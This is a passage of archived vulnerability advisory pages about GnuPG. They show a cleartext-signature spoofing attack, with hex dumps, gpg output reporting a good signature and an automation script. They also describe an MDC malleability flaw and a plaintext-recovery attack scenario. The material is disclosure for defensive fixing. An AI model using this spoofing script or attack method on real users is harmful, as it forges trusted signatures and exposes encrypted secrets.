 0c   Signed payload__</span></span></code></pre><!----> <p>Alice signs the=
 payload, and sends it back to Mallory:</p> <!----><pre class=3D"shiki gith=
ub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=
=3D"0"><code><span class=3D"line"><span>00000000:   2d 2d 2d 2d  2d 42 45 4=
7  49 4e 20 50  47 50 20 53   -----BEGIN PGP S</span></span>
<span class=3D"line"><span>00000010:   49 47 4e 45  44 20 4d 45  53 53 41 4=
7  45 2d 2d 2d   IGNED MESSAGE---</span></span>
<span class=3D"line"><span>00000020:   2d 2d 0a 48  61 73 68 3a  20 53 48 4=
1  35 31 32 0a   --_Hash: SHA512_</span></span>
<span class=3D"line"><span>00000030:   0a 53 69 67  6e 65 64 20  70 61 79 6=
c  6f 61 64 0d   _Signed payload_</span></span>
<span class=3D"line"><span>00000040:   0c 0a 2d 2d  2d 2d 2d 42  45 47 49 4=
e  20 50 47 50   __-----BEGIN PGP</span></span>
<span class=3D"line"><span>00000050:   20 53 49 47  4e 41 54 55  52 45 2d 2=
d  2d 2d 2d 0a    SIGNATURE-----_</span></span>
<span class=3D"line"><span>[...]</span></span>
<span class=3D"line"><span>00000100:   67 55 3d 0a  3d 54 56 52  34 0a 2d 2=
d  2d 2d 2d 45   gU=3D_=3DTVR4_-----E</span></span>
<span class=3D"line"><span>00000110:   4e 44 20 50  47 50 20 53  49 47 4e 4=
1  54 55 52 45   ND PGP SIGNATURE</span></span>
<span class=3D"line"><span>00000120:   2d 2d 2d 2d  2d                     =
                 -----</span></span></code></pre><!----> <p>Mallory then in=
jects a payload after the signed payload:</p> <!----><pre class=3D"shiki gi=
thub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabinde=
x=3D"0"><code><span class=3D"line"><span>00000000:   2d 2d 2d 2d  2d 42 45 =
47  49 4e 20 50  47 50 20 53   -----BEGIN PGP S</span></span>
<span class=3D"line"><span>00000010:   49 47 4e 45  44 20 4d 45  53 53 41 4=
7  45 2d 2d 2d   IGNED MESSAGE---</span></span>
<span class=3D"line"><span>00000020:   2d 2d 0a 48  61 73 68 3a  20 53 48 4=
1  35 31 32 0a   --_Hash: SHA512_</span></span>
<span class=3D"line"><span>00000030:   0a 53 69 67  6e 65 64 20  70 61 79 6=
c  6f 61 64 0d   _Signed payload_</span></span>
<span class=3D"line"><span>00000040:   0d 0d 0d 0d  0d 0d 0d 0d  0d 0d 0d 0=
d  0d 0d 0d 0d   ________________</span></span>
<span class=3D"line"><span>[...]</span></span>
<span class=3D"line"><span>00004e40:   0d 0d 0d 0d  0d 0d 0d 0d  0d 0d 0d 0=
d  0d 0d 0d 0d   ________________</span></span>
<span class=3D"line"><span>00004e50:   0c 55 6e 73  69 67 6e 65  64 20 70 6=
1  79 6c 6f 61   _Unsigned payloa</span></span>
<span class=3D"line"><span>00004e60:   64 0a 2d 2d  2d 2d 2d 42  45 47 49 4=
e  20 50 47 50   d_-----BEGIN PGP</span></span>
<span class=3D"line"><span>00004e70:   20 53 49 47  4e 41 54 55  52 45 2d 2=
d  2d 2d 2d 0a    SIGNATURE-----_</span></span>
<span class=3D"line"><span>00004e80:   0a 69 48 55  45 41 52 59  4b 41 42 3=
0  57 49 51 54   _iHUEARYKAB0WIQT</span></span>
<span class=3D"line"><span>00004e90:   78 65 51 4f  30 6b 66 75  59 35 74 5=
0  45 74 50 78   xeQO0kfuY5tPEtPx</span></span>
<span class=3D"line"><span>00004ea0:   4c 71 31 73  4a 6f 33 75  64 68 77 5=
5  43 61 50 59   Lq1sJo3udhwUCaPY</span></span>
<span class=3D"line"><span>00004eb0:   39 2b 41 41  4b 43 52 42  4c 71 31 7=
3  4a 6f 33 75   9+AAKCRBLq1sJo3u</span></span>
<span class=3D"line"><span>00004ec0:   64 0a 68 79  53 4f 41 51  43 6f 6e 6=
e  36 73 69 57   d_hySOAQConn6siW</span></span>
<span class=3D"line"><span>00004ed0:   68 31 30 6d  6a 79 4b 45  54 57 43 3=
9  37 58 51 2f   h10mjyKETWC97XQ/</span></span>
<span class=3D"line"><span>00004ee0:   39 33 45 4d  38 54 76 78  68 64 66 4=
a  41 61 65 62   93EM8TvxhdfJAaeb</span></span>
<span class=3D"line"><span>00004ef0:   4f 49 6d 41  45 41 72 32  36 65 4c 4=
7  36 30 34 49   OImAEAr26eLG604I</span></span>
<span class=3D"line"><span>00004f00:   35 2b 0a 42  32 50 4f 32  66 55 36 6=
4  63 6e 59 73   5+_B2PO2fU6dcnYs</span></span>
<span class=3D"line"><span>00004f10:   52 50 6d 71  53 4f 6c 4b  6a 34 70 7=
4  48 62 2b 33   RPmqSOlKj4ptHb+3</span></span>
<span class=3D"line"><span>00004f20:   67 55 3d 0a  3d 54 56 52  34 0a 2d 2=
d  2d 2d 2d 45   gU=3D_=3DTVR4_-----E</span></span>
<span class=3D"line"><span>00004f30:   4e 44 20 50  47 50 20 53  49 47 4e 4=
1  54 55 52 45   ND PGP SIGNATURE</span></span>
<span class=3D"line"><span>00004f40:   2d 2d 2d 2d  2d                     =
                 -----</span></span></code></pre><!----> <p>Alice sends the=
 spoofed message to Bob, and Bob verifies it with GnuPG, which succeeds des=
pite the plaintext having additional content:</p> <!----><pre class=3D"shik=
i github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tab=
index=3D"0"><code><span class=3D"line"><span>$ cat cs.long </span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNED MESSAGE-----</span></span>
<span class=3D"line"><span>Hash: SHA512</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>Signed payload</span></span>
<span class=3D"line"><span>Unsigned payload</span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>iHUEARYKAB0WIQTxeQO0kfuY5tPEtPxLq1sJo3udhwUCaPY9=
+AAKCRBLq1sJo3ud</span></span>
<span class=3D"line"><span>hySOAQConn6siWh10mjyKETWC97XQ/93EM8TvxhdfJAaebOI=
mAEAr26eLG604I5+</span></span>
<span class=3D"line"><span>B2PO2fU6dcnYsRPmqSOlKj4ptHb+3gU=3D</span></span>
<span class=3D"line"><span>=3DTVR4</span></span>
<span class=3D"line"><span>-----END PGP SIGNATURE-----</span></span>
<span class=3D"line"><span>$ gpg --verify cs.long</span></span>
<span class=3D"line"><span>gpg: invalid armor: line longer than 20000 chara=
cters</span></span>
<span class=3D"line"><span>gpg: Signature made Mon 20 Oct 2025 03:49:44 PM =
CEST</span></span>
<span class=3D"line"><span>gpg:                using EDDSA key F17903B491FB=
98E6D3C4B4FC4BAB5B09A37B9D87</span></span>
<span class=3D"line"><span>gpg: Good signature from "online" [ultimate]</sp=
an></span></code></pre><!----> <p>A script to automate this is provided:</p=
> <!----><pre class=3D"shiki github-dark-default" style=3D"background-color=
:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>let=
 signed_payload =3D "Signed payload"</span></span>
<span class=3D"line"><span>let unsigned_payload =3D "Unsigned payload"</spa=
n></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>let payload =3D ($signed_payload | fill -c "&#92=
;r" -w 19999) + "=0C" + $unsigned_payload</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>let cs_good =3D "plaintext" | gpg -au online --c=
learsign</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>let ds_long =3D $payload</span></span>
<span class=3D"line"><span>| str substring 0..&#x3C;19998</span></span>
<span class=3D"line"><span>| str replace -ra '[ &#92;t&#92;r&#92;n]+$' (if =
($in | split chars | last) =3D=3D "&#92;r" &#123; "&#92;r" &#125; else &#12=
3; '' &#125;)</span></span>
<span class=3D"line"><span>| bytes build ($in | into binary) 0x[0c]</span><=
/span>
<span class=3D"line"><span>| do &#123;$in | save -f payload.ds; $in&#125; $=
in</span></span>
<span class=3D"line"><span>| gpg -au online --clearsign</span></span>
<span class=3D"line"><span>| do &#123;$in | save -f payload.ds.asc; $in&#12=
5; $in</span></span>
<span class=3D"line"><span>| lines | skip 4 | str join "&#92;n"</span></spa=
n>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>let spoofed =3D $cs_good | lines | first 3 | app=
end [$payload $ds_long] | str join "&#92;n"</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>$spoofed | save -f payload.spoofed.asc</span></s=
pan>
<span class=3D"line"><span>gpg --verify cs.long</span></span></code></pre><=
!----><!----></article><!----><!----></main> <footer class=3D"bg-blue-500 p=
-4">contact: <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__"=
 data-cfemail=3D"ea8985849e8b899eaa8d9a8dc48c8b8386">[email&#160;protected]=
</a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasync=
=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.=
min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="04-malleability.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Encrypted message malleability checks are incorrectly enforced causing pla=
intext recovery attacks</h1> <!----><p>A flaw in <em>GnuPG</em>=E2=80=99s e=
nforcement of integrity protections allows practical malleability of encryp=
ted messages. Specifically, GnuPG violates specified requirements for <em>M=
odification Detection Code</em> (MDC) verification, permitting attackers to=
 manipulate encrypted packets in ways that can lead to plaintext recovery a=
ttacks under realistic conditions.</p> <h2>Impact</h2> <p>A user might be t=
ricked into decrypting and publishing a secret encrypted message, e.g. by c=
hanging packet types of a secret message to look like a public key packet.<=
/p> <h2>Details</h2> <p><em>GnuPG</em> defaults to using a MDC for proving =
integrity. <a href=3D"https://datatracker.ietf.org/doc/html/rfc9580#section=
-5.13.1-6" rel=3D"nofollow">RFC 9580</a> specifies the MDC format as:</p> <=
blockquote><p>Two constant octets with the values 0xD3 and 0x14 are appende=
d to the plaintext. Then, the plaintext of the data to be encrypted is pass=
ed through the SHA-1 hash function. The input to the hash function is compr=
ised of the prefix data described above and all of the plaintext, including=
 the trailing constant octets 0xD3, 0x14. The 20 octets of the SHA-1 hash a=
re then appended to the plaintext (after the constant octets 0xD3, 0x14) an=
d encrypted along with the plaintext using the same CFB context. This trail=
ing checksum is known as the Modification Detection Code (MDC).</p> <p>Duri=
ng decryption, the plaintext data should be hashed with SHA-1, including th=
e prefix data as well as the trailing constant octets 0xD3, 0x14, but exclu=
ding the last 20 octets containing the SHA-1 hash. The computed SHA-1 hash =
is then compared with the last 20 octets of plaintext. A mismatch of the ha=
sh indicates that the message has been modified and MUST be treated as a se=
curity problem. Any failure SHOULD be reported to the user.</p></blockquote=
> <p><em>GnuPG</em> violates this requirement in two dangerous ways:</p> <o=
l><li>Packets can be modified by an attacker to output a failure that appea=
rs harmless to the user, such as truncation, and</li> <li>it does not disca=
rd inputs known to be a security problem and continues processing the data.=
</li></ol> <p>In <code>decrypt-data.c</code>=E2=80=99s <code>decrypt_data</=
code> function, this code can set the return code to invalid packet when an=
 irregular end-of-file was seen:</p> <!----><pre class=3D"shiki github-dark=
-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><=
code><span class=3D"line"><span style=3D"color:#E6EDF3">ed</span><span styl=
e=3D"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">buf </span><span=
 style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> NULL</spa=
n><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (dfx</span><span style=3D"color:#FF7B72">-></span><span sty=
le=3D"color:#E6EDF3">eof_seen </span><span style=3D"color:#FF7B72">></span>=
<span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#E6EDF3">)</spa=
n></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    rc </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> gpg_error</spa=
n><span style=3D"color:#E6EDF3">(GPG_ERR_INV_PACKET);</span></span></code><=
/pre><!----> <p>However, the code handling this return code in <code>mainpr=
oc.c</code>=E2=80=99s <code>proc_encrypted</code> function does not adequat=
ely handle this case:</p> <!----><pre class=3D"shiki github-dark-default" s=
tyle=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span =
class=3D"line"><span style=3D"color:#E6EDF3">result </span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> decrypt_data</span><=
span style=3D"color:#E6EDF3"> (c</span><span style=3D"color:#FF7B72">-></sp=
an><span style=3D"color:#FFA657">ctrl</span><span style=3D"color:#E6EDF3">,=
 c, pkt</span><span style=3D"color:#FF7B72">-></span><span style=3D"color:#=
E6EDF3">pkt.encrypted, c</span><span style=3D"color:#FF7B72">-></span><span=
 style=3D"color:#FFA657">dek</span><span style=3D"color:#E6EDF3">,</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">                       &=
#x26;</span><span style=3D"color:#FFA657">compl_error</span><span style=3D"=
color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">// ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125; </span><span styl=
e=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span><spa=
n style=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><s=
pan style=3D"color:#E6EDF3">result </span><span style=3D"color:#FF7B72">||<=
/span><span style=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">=
gpg_err_code</span><span style=3D"color:#E6EDF3">(result) </span><span styl=
e=3D"color:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> GPG_ERR_BAD=
_SIGNATURE</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                       &=
#x26;&#x26;</span><span style=3D"color:#FF7B72"> !</span><span style=3D"col=
or:#E6EDF3">pkt</span><span style=3D"color:#FF7B72">-></span><span style=3D=
"color:#E6EDF3">pkt.encrypted</span><span style=3D"color:#FF7B72">-></span>=
<span style=3D"color:#E6EDF3">aead_algo</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                       &=
#x26;&#x26;</span><span style=3D"color:#E6EDF3"> opt.ignore_mdc_error)) &#1=
23;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  /* All is fine or for =
an MDC message the MDC failed but the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * --ignore-mdc-error =
option is active.  For compatibility</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * reasons we issue GO=
ODMDC also for AEAD messages.  */</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  write_status</span><sp=
an style=3D"color:#E6EDF3">(STATUS_DECRYPTION_OKAY);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (opt.verbose </span><span style=3D"color:#FF7B72">></sp=
an><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#E6EDF3">)</=
span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    log_info</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#D2A8FF">_</span><spa=
n style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"decryption=
 okay</span><span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color=
:#A5D6FF">"</span><span style=3D"color:#E6EDF3">));</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (pkt->pkt.encrypted->aead_algo) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    write_status</span><=
span style=3D"color:#E6EDF3">(STATUS_GOODMDC);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    compliance_de_vs </s=
pan><span style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF">=
 4</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span><s=
pan style=3D"color:#E6EDF3"> (pkt->pkt.encrypted->mdc_method </span><span s=
tyle=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#FF7B72"> !<=
/span><span style=3D"color:#E6EDF3">result) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    write_status</span><=
span style=3D"color:#E6EDF3">(STATUS_GOODMDC);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    compliance_de_vs </s=
pan><span style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF">=
 4</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    log_info</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#D2A8FF">_</span><spa=
n style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"WARNING: m=
essage was not integrity protected</span><span style=3D"color:#FF7B72">&#92=
;n</span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3=
">));</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125; </span><span styl=
e=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span><spa=
n style=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">gpg_err_co=
de</span><span style=3D"color:#E6EDF3">(result) </span><span style=3D"color=
:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> GPG_ERR_BAD_SIGNATURE=
</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">           ||</span><spa=
n style=3D"color:#D2A8FF"> gpg_err_code</span><span style=3D"color:#E6EDF3"=
>(result) </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"=
color:#E6EDF3"> GPG_ERR_TRUNCATED) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  glo_ctrl.lasterr </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> re=
sult;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  log_error</span><span =
style=3D"color:#E6EDF3">(</span><span style=3D"color:#D2A8FF">_</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"WARNING: en=
crypted message has been manipulated!</span><span style=3D"color:#FF7B72">&=
#92;n</span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6E=
DF3">));</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  write_status</span><sp=
an style=3D"color:#E6EDF3">(STATUS_BADMDC);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  write_status</span><sp=
an style=3D"color:#E6EDF3">(STATUS_DECRYPTION_FAILED);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125; </span><span styl=
e=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</span>=
</span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">gpg_err_code</spa=
n><span style=3D"color:#E6EDF3">(result) </span><span style=3D"color:#FF7B7=
2">=3D=3D</span><span style=3D"color:#E6EDF3"> GPG_ERR_BAD_KEY</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      ||</span><span sty=
le=3D"color:#D2A8FF"> gpg_err_code</span><span style=3D"color:#E6EDF3">(res=
ult) </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"color=
:#E6EDF3"> GPG_ERR_CHECKSUM</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      ||</span><span sty=
le=3D"color:#D2A8FF"> gpg_err_code</span><span style=3D"color:#E6EDF3">(res=
ult) </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"color=
:#E6EDF3"> GPG_ERR_CIPHER_ALGO) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (c->symkeys)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      write_status_text<=
/span><span style=3D"color:#E6EDF3">(STATUS_ERROR,</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">                        =
"symkey_decrypt.maybe_error"</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">                        =
" 11_BAD_PASSPHRASE"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (c->dek </span><span style=3D"color:#FF7B72">&#x26;&#x2=
6;</span><span style=3D"color:#FF7B72"> *</span><span style=3D"color:#E6EDF=
3">c->dek->s2k_cacheid </span><span style=3D"color:#FF7B72">!=3D</span><spa=
n style=3D"color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">=00</span>=
<span style=3D"color:#A5D6FF">'</span><span style=3D"color:#E6EDF3">) &#123=
;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (opt.debug)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        log_debug</span>=
<span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"cleare=
d passphrase cached with ID: </span><span style=3D"color:#FF7B72">%s&#92;n<=
/span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">,=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                  c->dek=
->s2k_cacheid);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      passphrase_clear_c=
ache</span><span style=3D"color:#E6EDF3">(c->dek->s2k_cacheid);</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  glo_ctrl.lasterr </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> re=
sult;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  write_status</span><sp=
an style=3D"color:#E6EDF3">(STATUS_DECRYPTION_FAILED);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  log_error</span><span =
style=3D"color:#E6EDF3">(</span><span style=3D"color:#D2A8FF">_</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"decryption =
failed: </span><span style=3D"color:#FF7B72">%s&#92;n</span><span style=3D"=
color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">), </span><span style=
=3D"color:#D2A8FF">gpg_strerror</span><span style=3D"color:#E6EDF3">(result=
));</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  /* Hmmm: does this wor=
k when we have encrypted using multiple</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * ways to specify the=
 session key (symmmetric and PK). */</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>Additionally to that, since <em>GnuPG</em> utilizes buf=
fered I/O, parsing of the decrypted plaintext is done before MDC checking, =
which an attacker can use for arriving at the same outcome as above, for ex=
ample by compressing the encrypted packet plus a buffer, and cutting off th=
e last few bytes of the encrypted text, which causes <code>do_compress</cod=
e> in <code>compress.c</code> to exit the entire program with a harmless-ap=
pearing error code while output is still written:</p> <!----><pre class=3D"=
shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3"=
 tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#FF7B72">el=
se</span><span style=3D"color:#FF7B72"> if</span><span style=3D"color:#E6ED=
F3"> (zrc </span><span style=3D"color:#FF7B72">!=3D</span><span style=3D"co=
lor:#E6EDF3"> Z_OK) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (zs->msg)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        log_error</span>=
<span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"zlib d=
eflate problem: </span><span style=3D"color:#FF7B72">%s&#92;n</span><span s=
tyle=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">, zs->msg);</s=
pan></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    else</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        log_error</span>=
<span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"zlib d=
eflate problem: rc=3D</span><span style=3D"color:#FF7B72">%d&#92;n</span><s=
pan style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">, zrc);</=
span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    write_status_error</=
span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"z=
lib.deflate"</span><span style=3D"color:#E6EDF3">, </span><span style=3D"co=
lor:#D2A8FF">gpg_error</span><span style=3D"color:#E6EDF3">(GPG_ERR_INTERNA=
L));</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    g10_exit</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">2</span><spa=
n style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <h3>Attack scenario</h3> <p>Message malleability is usuall=
y not a likely impactful vulnerability, since a user would usually notice t=
he change. However, since <em>GnuPG</em> handles PGP packets instead of jus=
t plaintext it allows the scenario described below.</p> <p>Additionally, to=
 perform a working malleation attack on AES-256-CFB, the attacker has to pe=
rform a known-plaintext attack since the ciphertext is XORed into the plain=
text, but the predictable structure of PGP messages makes this practically =
exploitable. Successful exploitation could involve an attacker sending a ma=
nipulated message to the victim, the victim unknowingly decrypting the mess=
age, and handling the output as if it was a different plaintext.</p> <p>Mal=
lory is an attacker who either later gets access to an encrypted message, o=
r as as an active MITM.
Mallory=E2=80=99s goal is to decrypt an encrypted message that Alice encryp=
ted for Bob.</p> <ul><li>Alice has Bob=E2=80=99s public key</li> <li>Alice =
encrypts the plaintext =E2=80=9CSECRET=E2=80=9D to Bob=E2=80=99s public key=
, and sends the ciphertext as a PGP message to Bob.</li> <li>Mallory gets a=
ccess to the encrypted message, and would like to decrypt it, so Mallory mo=
difies the message to be a public key.</li> <li>Mallory sends Bob the modif=
ied message, asking for a signature on the public key =E2=80=94 a common no=
t suspicious action for PGP users.</li> <li>Bob decrypts and signs the appa=
rent public key, and publishes the signature along with the public key to a=
 keyserver.</li> <li>Mallory fetches the key from the keyserver and retriev=
es the accidentally decrypted plaintext</li></ul> <h3>Detailed steps to rep=
roduce</h3> <p>In the interest of a timely disclosure, we cannot provide an=
 refined end-to-end demonstration of the issue. However, under the followin=
g assumptions we can demonstrate relevant parts of the attack. In combinati=
on with the buggy code pointed out above, we believe that there is sufficie=
nt risk of a serious vulnerability to warrant investigation and fixes by <e=
m>GnuPG</em> maintainers.</p> <p>We assume that:</p> <ul><li>We have access=
 to the encrypted data</li> <li>The encrypted data is exactly 64 bytes of t=
otal entropy</li> <li>Bob uses <em>GnuPG 2.4.8</em></li> <li>Bob has no non=
-standard config and uses <code>head -c64 /dev/urandom | gpg -e -r online</=
code> to encrypt his data</li></ul> <p>This encrypted data follows a recogn=
izable structure:</p> <!----><pre class=3D"shiki github-dark-default" style=
=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span clas=
s=3D"line"><span>Public-Key Encrypted Session Key Packet, old CTB, 2 header=
 bytes + 94 bytes</span></span>
<span class=3D"line"><span>    Version: 3</span></span>
<span class=3D"line"><span>[...]</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>Sym. Encrypted and Integrity Protected Data Pack=
et, new CTB, 2 header bytes + 126 bytes</span></span>
<span class=3D"line"><span>=E2=94=82   Version: 1</span></span>
<span class=3D"line"><span>=E2=94=82   Session key: 70739CD50B03B723FD9E8CB=
DAB2F2DE942F746F046BC9FD552B2F5CEC5E16696</span></span>
<span class=3D"line"><span>=E2=94=82   Symmetric algo: AES-256</span></span>
<span class=3D"line"><span>=E2=94=82   Decryption successful</span></span>
<span class=3D"line"><span>=E2=94=82 </span></span>
<span class=3D"line"><span>=E2=94=82   00000000  d2                        =
                         CTB</span></span>
<span class=3D"line"><span>=E2=94=82   00000001     7e                     =
                         length</span></span>
<span class=3D"line"><span>=E2=94=82   00000002        01                  =
                         version</span></span>
<span class=3D"line"><span>=E2=94=82   00000003           d7 cc f2 68 a8  c=
9 aa cd f3 db 5d 07 bd      ...h......]..</span></span>
<span class=3D"line"><span>=E2=94=82   [...]</span></span>
<span class=3D"line"><span>=E2=94=82 </span></span>
<span class=3D"line"><span>=E2=94=9C=E2=94=80=E2=94=80 Compressed Data Pack=
et, old CTB, 2 header bytes + indeterminate length</span></span>
